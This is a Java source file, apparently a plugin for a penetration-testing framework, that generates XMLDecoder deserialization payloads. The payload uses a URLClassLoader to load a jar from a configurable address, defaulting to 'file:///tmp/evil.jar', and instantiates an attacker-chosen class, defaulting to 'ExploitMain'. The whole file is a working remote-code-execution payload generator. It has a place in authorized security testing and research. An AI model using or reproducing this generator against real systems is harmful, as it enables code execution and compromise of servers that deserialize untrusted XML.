package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class LoadJarPayloadGenerator implements IHelper {

    public String getHelperTabCaption() {
        return "load jar";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg argAddress = XMLDecoderPlugin.pluginHelper.createArg();
        argAddress.setName("jar_address");
        argAddress.setType(IArg.ARG_TYPE_STRING);
        argAddress.setDefaultValue("file:///tmp/evil.jar");
        argAddress.setDescription("jar地址");
        argAddress.setRequired(true);
        args.add(argAddress);

        IArg argClassName = XMLDecoderPlugin.pluginHelper.createArg();
        argClassName.setName("class_name");
        argClassName.setType(IArg.ARG_TYPE_STRING);
        argClassName.setDefaultValue("ExploitMain");
        argClassName.setDescription("要实例化的class");
        argClassName.setRequired(true);
        args.add(argClassName);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String jar_address = (String)customArgs.get("jar_address");
        String class_name = (String)customArgs.get("class_name");
        String payload = String.format("<java>\n" +
                "    <new class=\"java.net.URLClassLoader\">\n" +
                "        <array class=\"java.net.URL\" length=\"1\">\n" +
                "            <void index=\"0\"><object class=\"java.net.URL\"><string>%s</string></object></void>\n" +
                "        </array>\n" +
                "        <void method=\"loadClass\">\n" +
                "            <string>%s</string>\n" +
                "            <void method=\"newInstance\"/>\n" +
                "        </void>\n" +
                "    </new>\n" +
                "</java>",jar_address,class_name);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
